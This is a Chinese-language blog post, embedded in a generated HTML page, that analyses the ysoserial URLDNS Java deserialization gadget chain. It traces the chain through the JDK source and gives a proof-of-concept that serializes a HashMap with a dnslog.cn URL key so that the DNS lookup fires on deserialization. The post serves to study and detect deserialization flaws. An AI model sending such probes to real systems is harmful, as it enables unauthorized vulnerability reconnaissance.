@@ -1,0 +1,401 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN ">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hoylindo || Java-URLDNS链</title>
+    <meta name="author" content="hoylindo">
+    <meta name="description" content="嗨，这里是一个搭建的不太熟练的小破站 ">
+    <meta name="keywords" content=" ">
+    <link rel="icon" href="/1.jpg">
+    <link rel="stylesheet" href="/css/antd.min.css">
+    
+    <link rel="stylesheet" href="/css/maiden-theme.css">
+    
+    <script src="/js/vue.js"></script>
+    <script src="/js/antd.min.js"></script>
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body>
+
+    <div id="loading"
+        style="height: 100vh; width: 100%; position: fixed;display: flex;z-index: 200; justify-content: space-between;">
+        <div id="loadleft" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div id="loadright" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div
+            style="position: fixed; height: 100vh; width: 100%;display: flex;justify-content: center;align-items: center;">
+            <div id="loadcontent"
+                style="width:400px;height:400px;padding:50px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px#fba3cf; text-align:center;opacity:1;transition:opacity 0.3s ease-out;">
+                <div>
+                    <h2>LOADING...</h2>
+                    <p>dadada~</p>
+                    <div>
+                        <img src="/dancingkitty.gif" alt="loading">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="layout">
+        <transition name="into">
+            <div v-show="show_page" style="display: none;">
+                <div id="menu_show">
+                     
+<nav id="menu">
+    <div class="desktop-menu">
+        <a href="/">
+            <span class="title">Hoylindo</span>
+        </a>
+        
+        <a href="/">
+            <span>
+                <a-icon type="home" theme="filled" />
+            </span>
+            <span>home</span>
+        </a>
+        
+        <a href="/about">
+            <span>
+                <a-icon type="idcard" theme="filled" />
+            </span>
+            <span>about</span>
+        </a>
+        
+        <a href="/archives">
+            <span>
+                <a-icon type="folder" theme="filled" />
+            </span>
+            <span>archives</span>
+        </a>
+        
+        <a href="/categories">
+            <span>
+                <a-icon type="book" theme="filled" />
+            </span>
+            <span>categories</span>
+        </a>
+        
+        <a href="/tags">
+            <span>
+                <a-icon type="tags" theme="filled" />
+            </span>
+            <span>tags</span>
+        </a>
+        
+    </div>
+
+    <div :class="'phone-menu ' + menu_show" id="phone-menu">
+        <div :class="'title'" @click="menu_show=!menu_show">
+            <span style="margin-right: 10px;">
+                <a-icon type="appstore" theme="filled" />
+            </span>
+            <span>Hoylindo</span>
+        </div>
+        <div class="items" v-show="menu_show">
+            
+            <a href="/">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="home" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">home</div>
+                </div>
+            </a>
+            
+            <a href="/about">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="idcard" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">about</div>
+                </div>
+            </a>
+            
+            <a href="/archives">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="folder" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">archives</div>
+                </div>
+            </a>
+            
+            <a href="/categories">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="book" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">categories</div>
+                </div>
+            </a>
+            
+            <a href="/tags">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="tags" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">tags</div>
+                </div>
+            </a>
+            
+        </div>
+        <div class="curtain" v-show="menu_show"></div>
+    </div>
+
+</nav>
+                </div>
+
+                <div id="main">
+                     
+<link rel="stylesheet" href="/css/post-body.css">
+<div class="article">
+    <div>
+        <h1>Java-URLDNS链 </h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <a-icon type="calendar" theme="filled" />
+            </span>
+            2023/8/19
+        </span>
+
+        
+        <span class="category">
+            <a href="/categories/关于web安全">
+                <span class="icon">
+                    <a-icon type="book" theme="filled" />
+                </span>
+                关于web安全
+            </a>
+        </span>
+        
+
+        
+
+        <span class="tags">
+            <span class="icon">
+                <a-icon type="tags" theme="filled" />
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/Java" style=color:#ffa2c4>
+                    Java
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+
+    <div class="content" v-pre>
+        <br>
+
+<span id="more"></span>
+
+<ul>
+<li><code>URLDNS</code>是<code>ysoserial</code>中的一条利用链，通常用于检测是否存在<code>Java</code>反序列化漏洞，该利用链具有如下特点：<ul>
+<li> URLDNS 利用链只能发起 DNS 请求，并不能进行其它利用</li>
+<li> 不限制 jdk 版本，使用 Java 内置类，对第三方依赖没有要求</li>
+<li> 目标无回显，可以通过 DNS 请求来验证是否存在反序列化漏洞</li>
+</ul>
+</li>
+</ul>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><ul>
+<li><code>java.util.HashMap</code>实现了<code>Serializable</code>接口，重写了<code>readObject</code>, 在反序列化时会调用<code>hash</code>函数计算<code>key</code>的<code>hashCode</code>，而<code>java.net.URL</code>的<code>hashCode</code>在计算时会调用<code>getHostAddress</code>来解析域名, 从而发出<code>DNS</code>请求</li>
+<li>整个<code>URLDNS</code>的<code>Gadget</code>：<ul>
+<li>HashMap-&gt;readObject()</li>
+<li>HashMap-&gt;hash()</li>
+<li>URL-&gt;hashCode()</li>
+<li>URLStreamHandler-&gt;hashCode()</li>
+<li>URLStreamHandler-&gt;getHostAddress()</li>
+<li>InetAddress-&gt;getByName()</li>
+</ul>
+</li>
+<li>要构造这个Gadget，只需要初始化⼀个<code>java.net.URL</code>对象，作为<code>key</code>放在<code>java.util.HashMap</code>中；然后，设置这个URL对象的<code>hashCode</code>为初始值**-1** ，这样反序列化时将会重新计算其<code>hashCode</code>，才能触发到后⾯的DNS请求，否则不会调用<code>URL-&gt;hashCode()</code> </li>
+</ul>
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><ul>
+<li><p><code>HashMap.readObject()</code>—<code>HashMap.putVal()</code>—<code>HashMap.hash()</code>—<code>URL.hashCode()</code></p>
+</li>
+<li><p>先跟进<code>HashMap</code>，看<code>readObject()</code>函数，这里通过<code>for</code>循环来将<code>HashMap</code>中存储的<code>key</code>通过<code>K key = (K) s.readObject();</code>来进行反序列化，在这之后调用<code>putVal()</code>和<code>hash()</code>函数，将<code>HashMap</code>的键名计算了<code>hash</code></p>
+<img src="https://s3.bmp.ovh/imgs/2023/08/19/3a04f630c4b0107b.png" style="zoom:80%;" /></li>
+<li><p>跟进<code>hash()</code>函数，当<code>key!=null</code>时会调用<code>hashCode()</code>函数</p>
+<img src="https://s3.bmp.ovh/imgs/2023/08/19/92f27d08ebf4bc07.png" style="zoom:80%;" /></li>
+<li><p>跟进<code>hashCode()</code>函数，在<code>ysoserial</code>中的<code>URLDNS</code>是利用<code>URL</code>对象，于是跟进<code>Java</code>基本类<code>URL</code>中关于<code>hashCode()</code>的部分<code>java/net/URL.java</code>，由于<code>hashCode</code>的值默认为<code>-1</code>，因此会执行<code>hashCode = handler.hashCode(this);</code></p>
+<img src="https://s3.bmp.ovh/imgs/2023/08/19/8dff9f4f0d3f22ff.png" style="zoom:80%;" />
+
+<img src="https://s3.bmp.ovh/imgs/2023/08/19/8104c68dbf363bc9.png" style="zoom:80%;" /></li>
+</ul>
+<img src="https://s3.bmp.ovh/imgs/2023/08/19/a79b4f7300b6ad1a.png" style="zoom:80%;" />
+
+<ul>
+<li><p>看<code>handler.hashCode()</code>函数，示例代码：</p>
+<pre><code class="java">import java.net.URL;
+
+public class Test2 &#123;
+    public static void main(String[] args) throws Exception &#123;
+            URL url = new URL(&quot;http://gr6gh1.dnslog.cn/&quot;);
+            url.hashCode();
+    &#125;
+&#125;
+</code></pre>
+</li>
+<li><p>成功触发DNS请求</p>
+<img src="D:\ALL\Github\Hexo\Blog\source\_posts\images\image-20230510194116524.png" alt="image-20230510194116524" style="zoom:80%;" /></li>
+<li><p>调试跟进<code>java/net/URLStreamHandler.java</code>中的<code>hashCode()</code>函数，可以看到调用了一个函数<code>getHostAddress()</code>来进行<code>DNS</code>解析返回对应的<code>IP</code></p>
+<img src="D:\ALL\Github\Hexo\Blog\source\_posts\images\image-20230510194636117.png" alt="image-20230510194636117" style="zoom:80%;" /></li>
+<li><p>在<code>ysoserial</code>中是通过<code>put()</code>函数来触发的，这一步的实现和前面的是一样的，都是通过<code>hash()</code>函数来实现的</p>
+<img src="D:\ALL\Github\Hexo\Blog\source\_posts\images\image-20230510195045066.png" alt="image-20230510195045066" style="zoom: 80%;" /></li>
+<li><p>当<code>HashMap</code>传入一个<code>URL</code>对象时，会进行一次<code>DNS</code>解析，并且<code>HashMap</code>实现了<code>Serializable</code>接口，重写了<code>readObject</code></p>
+</li>
+<li><p>当一个<code>Java</code>应用存在反序列化漏洞时，可以通过传入一个序列化后的<code>HashMap</code>数据（将<code>URL</code>对象作为<code>key</code>放入<code>HashMap</code>中）</p>
+</li>
+<li><p>当传入的数据到达该<code>Java</code>应用的反序列化漏洞点时，程序就会调用<code>HashMap</code>重写的<code>readObject()</code>函数来反序列化读取数据，进而触发<code>key.hashCode()</code>函数进行一次<code>DNS</code>解析</p>
+</li>
+</ul>
+<h3 id="ysoserial-项目代码分析"><a href="#ysoserial-项目代码分析" class="headerlink" title="ysoserial 项目代码分析"></a>ysoserial 项目代码分析</h3><ul>
+<li><p>这里通过继承<code>URLStreamHandler</code>类，重写<code>openConnection()</code>和<code>getHostAddress()</code>函数，目的在于: <code>HashMap-&gt;put</code>时也会调用<code>getHostAddress()</code>函数进行一次<code>DNS</code>解析，这里就是通过重写的<code>getHostAddress()</code>函数来覆盖掉原函数，从而使其不进行<code>DNS</code>解析，避免在<code>Payload</code>在创建的时候进行<code>DNS</code>解析</p>
+<img src="D:\ALL\Github\Hexo\Blog\source\_posts\images\image-20230510195719148.png" alt="image-20230510195719148" style="zoom:80%;" /></li>
+<li><p>代码<code>Reflections.setFieldValue(u, &quot;hashCode&quot;, -1);</code>中的<code>setFieldValue()</code>函数是<code>ysoserial</code>项目自定义的一个反射类中的函数</p>
+<img src="D:\ALL\Github\Hexo\Blog\source\_posts\images\image-20230510202131455.png" alt="image-20230510202131455" style="zoom:80%;" /></li>
+<li><p>通过反射来设置<code>URL</code>类的<code>hashCode</code>的值为<code>-1</code>，这是因为在<code>HashMap#put</code>时已经调用过一次<code>hashCode()</code>函数，<code>hashCode</code>的值会改变不再为<code>-1</code>，这样会导致在下一步经过<code>HashMap</code>的<code>readObject()</code>函数反序列化时直接返回<code>hashCode</code>的值，不再调用<code>handler.hashCode(this)</code>，因此利用反射来将<code>hashCode</code>的值设为<code>-1</code></p>
+</li>
+<li><p><code>ysoserial</code>为了防止在生成Payload的时候也执行了URL请求和DNS查询，所以重写了⼀个<code>SilentURLStreamHandler</code>类</p>
+</li>
+<li><p>最后利用<code>PayloadRunner.run()</code>来进行反序列化</p>
+<img src="D:\ALL\Github\Hexo\Blog\source\_posts\images\image-20230510202501568.png" alt="image-20230510202501568" style="zoom:80%;" /></li>
+<li><p>poc</p>
+<pre><code class="java">import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.net.URL;
+import java.text.SimpleDateFormat;
+import java.util.Date;
+import java.util.HashMap;
+
+public class URLDemo &#123;
+
+    public static void main(String[] args) throws Exception &#123;
+        Date nowTime = new Date();
+        HashMap hashmap = new HashMap();
+        URL url = new URL(&quot;http://lttx9f.dnslog.cn&quot;);
+        SimpleDateFormat simpleDateFormat = new SimpleDateFormat(&quot;yyyy-MM-dd hh:mm:ss&quot;);
+        Field filed = Class.forName(&quot;java.net.URL&quot;).getDeclaredField(&quot;hashCode&quot;);
+        filed.setAccessible(true);  // 绕过Java语言权限控制检查的权限
+        filed.set(url, 209);
+        hashmap.put(url, 209);
+        System.out.println(&quot;当前时间为: &quot; + simpleDateFormat.format(nowTime));
+        filed.set(url, -1);
+
+        try &#123;
+            FileOutputStream fileOutputStream = new FileOutputStream(&quot;./dnsser&quot;);
+            ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
+            objectOutputStream.writeObject(hashmap);
+            objectOutputStream.close();
+            fileOutputStream.close();
+
+            FileInputStream fileInputStream = new FileInputStream(&quot;./dnsser&quot;);
+            ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
+            objectInputStream.readObject();
+            objectInputStream.close();
+            fileInputStream.close();
+        &#125; catch (Exception e) &#123;
+            e.printStackTrace();
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+</li>
+<li><p>从请求结果中可以看出，在<code>Payload</code>生成阶段并没有发起<code>DNS</code>解析，而是在后续反序列化过程中进行的请求</p>
+<img src="D:\ALL\Github\Hexo\Blog\source\_posts\images\image-20230510203437960.png" alt="image-20230510203437960" style="zoom:80%;" />
+
+<img src="D:\ALL\Github\Hexo\Blog\source\_posts\images\image-20230510203523166.png" alt="image-20230510203523166" style="zoom:80%;" /></li>
+</ul>
+<p>参考链接：</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/327710.html">https://www.freebuf.com/articles/web/327710.html</a></p>
+
+    </div>
+
+    
+</div>
+                     
+<footer id="footer">
+    <div class="footer-wrap">
+        <div>
+            © 2022 - 2023 Hoylindo
+            <span class="footer-icon">
+                <a-icon type="flag" theme="filled" /></span>
+            @hoylindo
+        </div>
+        <div></div>
+        <div>Based on the <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo Engine</a> & <a
+                target="_blank" rel="noopener" href="https://github.com/korilin/hexo-theme-particle">Particle Theme</a></div>
+        
+    </div>
+
+</footer>
+
+<script src="/js/highlight.min.js"></script>
+<script src="/js/particle.js"></script>
+                </div>
+            </div>
+        </transition>
+    </div>
+
+    <canvas id="background" style="position:fixed;top:0;left:0;width:100vw;height:100vh;pointer-events:none;z-index:-1" ></canvas> 
+    <script src="/js/1.js"></script>
+    
+    <canvas class="fireworks" style="position: fixed; left: 0; top: 0; z-index: 99999999; pointer-events: none;"></canvas>
+    <script type="text/javascript" src="/js/aixin.js"></script>
+    <script type="text/javascript" src="/js/anime.min.js"></script>
+    <script type="text/javascript" src="/js/fireworks.js"></script>
+
+    <script>
+    new Vue({
+        el: "#layout",
+        data: {
+            show_page: false,
+            onload_menu: false,
+            menu_show: false,
+            card_top: 100
+        },
+        created: function () {
+            var that = this
+            window.onload = function () {
+                that.show_page = true
+                document.getElementById("loadcontent").style.opacity = 0
+                setTimeout(function () {
+                    document.getElementById("loadleft").style.width = 0
+                    document.getElementById("loadright").style.width = 0
+                }, 300)
+                setTimeout(function () {
+                    document.getElementById("loading").style = "display:none"
+                }, 600)
+            }
+        },
+        mounted: function () {
+            var that = this
+            window.addEventListener('scroll', function (e) {
+                that.menu_show = false
+            })
+        },
+        methods: {
+            home_click: function () {
+                window.scrollTo({
+                    top: window.innerHeight - 80,
+                    behavior: "smooth",
+                });
+            }
+        }
+    })
+</script>
+
+</body>
+
+</html>
